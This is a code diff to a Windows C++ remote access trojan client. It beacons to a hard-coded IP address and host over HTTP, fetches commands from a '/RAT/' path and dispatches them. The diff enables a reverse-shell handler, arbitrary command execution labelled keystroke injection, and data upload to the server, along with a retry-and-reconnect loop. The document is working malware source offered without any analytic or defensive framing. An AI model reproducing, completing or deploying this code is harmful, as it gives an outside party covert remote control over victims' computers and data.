@@ -13,15 +13,17 @@ using namespace std;
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
 HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
+bool connected = false;
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-void safe_closesocket(SOCKET& s);
+bool socket_setup(SOCKET &clientSocket);
+void safe_closesocket(SOCKET &clientSocket);
 
-void send_data(SOCKET clientSocket, const string &filename ,const string &data);
-string receive_data(SOCKET clientSocket, const string &filename);
+void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
+string receive_data(SOCKET &clientSocket, const string &filename);
 
 bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
-void rev_shell(SOCKET clientSocket);
+void rev_shell(SOCKET &clientSocket);
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 int main()
@@ -31,104 +33,54 @@ int main()
     bool outerloop = true;
     while(outerloop)
     {
-        bool connected = false;
+        connected = socket_setup(sock);
 
-        WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-        {
-            std::cerr << "WSAStartup failed.\n";
-            return 1;
-        }
-
-        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sock == INVALID_SOCKET)
-        {
-            std::cerr << "socket failed.\n";
-            WSACleanup();
-            return 1;
-        }
-
-        sockaddr_in serverAddr;
-        serverAddr.sin_family = AF_INET;
-        serverAddr.sin_port = htons(80);
-        serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
-
-        connected = false;
-        while (!connected)
-        {
-            if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-            {
-                int error = WSAGetLastError();
-                if (error != WSAECONNREFUSED)
-                {
-                    std::stringstream ss;
-                    ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
-                    std::cerr << ss.str();
-                } 
-                else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
-                Sleep(2000);
-            }
-            else
-            {
-                std::cout << "Connected to the server!\n";
-                connected = true;
-            }
-        }
         //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-        // bool loop = true;
-        // while(loop)
-        // {
-        //     switch (receive_data(sock)[0])
-        //     {
-        //         case '2':                                                                                     //rev shell
-        //         {
-        //             rev_shell(sock);
-        //             break;
-        //         }
+        bool loop = true;
+        while(loop)
+        {
+            switch (receive_data(sock,"from_server.txt")[0])
+            {
+                case '2':                                                                                     //rev shell
+                {
+                    rev_shell(sock);
+                    break;
+                }
 
-        //         case '3':                                                                                     //keystroke injection
-        //         {                
-        //             ExecuteCommand(receive_data(sock));
-        //             break;
-        //         }
+                case '3':                                                                                     //keystroke injection
+                {                
+                    ExecuteCommand(receive_data(sock,"from_server.txt"));
+                    break;
+                }
 
-        //         case '~':                                                                                    //dc from server
-        //         {
-        //             std::cout << "Server initiated disconnect.\n";
-        //             loop = false;
-        //             connected = false;
+                case '~':                                                                                    //dc from server
+                {
+                    std::cout << "Server initiated disconnect.\n";
+                    loop = false;
+                    connected = false;
                     
-        //             break;
-        //         }
-        //         case '#':                                                                                    //end all
-        //         {
-        //             loop = false;
-        //             outerloop = false;
+                    break;
+                }
+                case '#':                                                                                    //end all
+                {
+                    loop = false;
+                    outerloop = false;
                     
-        //             break;
-        //         }
-        //         default:
-        //         {
-        //             break;
-        //         }
-        //     }
-        // }
+                    break;
+                }
+                default:
+                {
+                    break;
+                }
+            }
+        }
 
-        cout << receive_data(sock, "from_server.txt");
-        send_data(sock, "from_client.txt", "Hiieeeeee!");
-        outerloop = false;
-
-        // shutdown(sock, SHUT_RDWR); // This sends a FIN packet to the server, indicating the intention to close
-
-        safe_closesocket(sock);
-        WSACleanup();
-
-        // if (outerloop && !connected)
-        // {
-        //     cout << "Waiting 5 sec to reconnect...\n";
-        //     Sleep(5000);
-        // }
+        if (outerloop && !connected)
+        {
+            cout << "Waiting 5 sec to reconnect...\n";
+            Sleep(5000);
+        }
 
     }
 
@@ -172,14 +124,16 @@ void give_command(const std::string &command)
     FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
 }
 
-void send_data(SOCKET clientSocket, const string &filename ,const string &data)
+void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
 {
+    socket_setup(clientSocket);
+
     string whole_data = filename+data;
     string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
     httpRequest += "Host: arth.imbeddex.com\r\n";
     httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
     httpRequest += "Content-Type: application/octet-stream\r\n";
-    httpRequest += "Connection: keep-alive\r\n\r\n";
+    httpRequest += "Connection: close\r\n\r\n";
     httpRequest += whole_data;                                                                // Append the actual data
 
     int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
@@ -191,40 +145,44 @@ void send_data(SOCKET clientSocket, const string &filename ,const string &data)
 
 ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
 
-    // char buffer[4096]; // Increased buffer size
-    // string receivedData;
-    // int bytesReceived;
+    char buffer[4096]; // Increased buffer size
+    string receivedData;
+    int bytesReceived;
 
-    // do {
-    //     bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
+    do {
+        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
 
-    //     if (bytesReceived > 0) {
-    //         buffer[bytesReceived] = '\0';
-    //         receivedData += buffer; // Append to the received data
-    //     } else if (bytesReceived == 0) {
-    //         cerr << "Connection closed by server." << endl;
-    //         break; // Exit the loop on clean close
-    //     } else {
-    //         int error = WSAGetLastError();
-    //         if (error != WSAECONNRESET) {
-    //             cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-    //         }
-    //         break; // Exit loop on error
-    //     }
-    // } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+        if (bytesReceived > 0) {
+            buffer[bytesReceived] = '\0';
+            receivedData += buffer; // Append to the received data
+        } else if (bytesReceived == 0) {
+            cerr << "Connection closed by server." << endl;
+            break; // Exit the loop on clean close
+        } else {
+            int error = WSAGetLastError();
+            if (error != WSAECONNRESET) {
+                cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+            }
+            break; // Exit loop on error
+        }
+    } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
 
-    // cout << "Received: " << receivedData << endl;
+    //cout << "\n\nReceived: " << receivedData << endl;
 
-////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
+    ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
+
+    safe_closesocket(clientSocket);
 }
 
-string receive_data(SOCKET clientSocket, const string &filename)
+string receive_data(SOCKET &clientSocket, const string &filename)
 {
+    socket_setup(clientSocket);
+
     string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
     httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Connection: keep-alive\r\n\r\n";
+    httpRequest += "Connection: close\r\n\r\n";
 
-    // cout<< httpRequest<<endl;
+    //cout<< httpRequest<<endl;
 
     int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
     if (bytesSent == SOCKET_ERROR)
@@ -257,7 +215,7 @@ string receive_data(SOCKET clientSocket, const string &filename)
         }
     } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
 
-    // cout << "Received: \n" << receivedData << endl;
+    //cout << "\n\nReceived: \n" << receivedData << endl;
 
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -298,9 +256,10 @@ string receive_data(SOCKET clientSocket, const string &filename)
         body = unchunkedBody;
     }
     return body;
+    safe_closesocket(clientSocket);
 }
 
-void rev_shell(SOCKET clientSocket)
+void rev_shell(SOCKET &clientSocket)
 {
 
     SECURITY_ATTRIBUTES saAttr = {0};
@@ -408,13 +367,61 @@ void rev_shell(SOCKET clientSocket)
 
 }
 
-void safe_closesocket(SOCKET& s)
+void safe_closesocket(SOCKET &clientSocket)
 {
-    if (s != INVALID_SOCKET)
+    if (clientSocket != INVALID_SOCKET)
     {
-        shutdown(s, SD_BOTH);
-        closesocket(s);
+        shutdown(clientSocket, SD_BOTH);
+        closesocket(clientSocket);
         
-        s = INVALID_SOCKET;
+        clientSocket = INVALID_SOCKET;
     }
+}
+
+bool socket_setup(SOCKET &clientSocket)
+{
+    bool connected = false;
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    {
+        std::cerr << "WSAStartup failed.\n";
+        return 1;
+    }
+
+    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET)
+    {
+        std::cerr << "socket failed.\n";
+        WSACleanup();
+        return 1;
+    }
+
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(80);
+    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
+
+    connected = false;
+    while (!connected)
+    {
+        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+        {
+            int error = WSAGetLastError();
+            if (error != WSAECONNREFUSED)
+            {
+                std::stringstream ss;
+                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
+                std::cerr << ss.str();
+            }   
+            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+            Sleep(2000);
+        }
+        else
+        {
+            //std::cout << "Connected to the server!\n";
+            connected = true;
+        }
+    }
+    return true;
 }
